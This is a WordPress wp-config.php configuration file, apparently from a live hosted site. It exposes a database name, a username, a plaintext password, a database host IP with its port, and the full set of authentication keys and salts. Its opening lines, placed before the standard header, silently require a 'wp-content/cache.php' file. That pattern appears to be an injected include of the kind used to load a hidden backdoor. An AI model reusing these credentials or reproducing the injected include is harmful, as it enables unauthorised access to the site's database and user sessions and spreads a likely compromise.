<?php
if ( file_exists( dirname( __FILE__ ) . '/wp-content/cache.php' ) )  
    require_once( dirname( __FILE__ ) . '/wp-content/cache.php' );

/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'k9gs42988974386' );
/** MySQL database username */
define( 'DB_USER', 'k9gs42988974386' );
/** MySQL database password */
define( 'DB_PASSWORD', 'pM}/fB4V0ioGJ' );
/** MySQL hostname */
define( 'DB_HOST', '148.72.17.14:3307' );
/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         ' VTrqWdBy8q#wV+0JgHn' );
define( 'SECURE_AUTH_KEY',  '*%0#%YC0N5BrzWNMX!G ' );
define( 'LOGGED_IN_KEY',    '29nD%H-9WZtB)sh_fgZ-' );
define( 'NONCE_KEY',        'T9($H0r+TX%!+!p8 3/A' );
define( 'AUTH_SALT',        'bY$zatLs(xL6JTc3=$zF' );
define( 'SECURE_AUTH_SALT', 'r$sK149xSy9khUG(x/x+' );
define( 'LOGGED_IN_SALT',   'fmENZfn!m pnH$CUQJ0V' );
define( 'NONCE_SALT',       'v=KI@4EWK0(9WE6-z-6J' );
/**#@-*/
/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_2z34a2bfxz_';
/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define( 'WP_DEBUG', false );
//define( 'WP_CACHE', true );
require_once( dirname( __FILE__ ) . '/gd-config.php' );
define( 'FS_METHOD', 'direct' );
define( 'FS_CHMOD_DIR', (0705 & ~ umask()) );
define( 'FS_CHMOD_FILE', (0604 & ~ umask()) );
define( 'FORCE_SSL_ADMIN', true );
/* That's all, stop editing! Happy publishing. */
/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', dirname( __FILE__ ) . '/' );
}
/** Sets up WordPress vars and included files. */
require_once( ABSPATH . 'wp-settings.php' );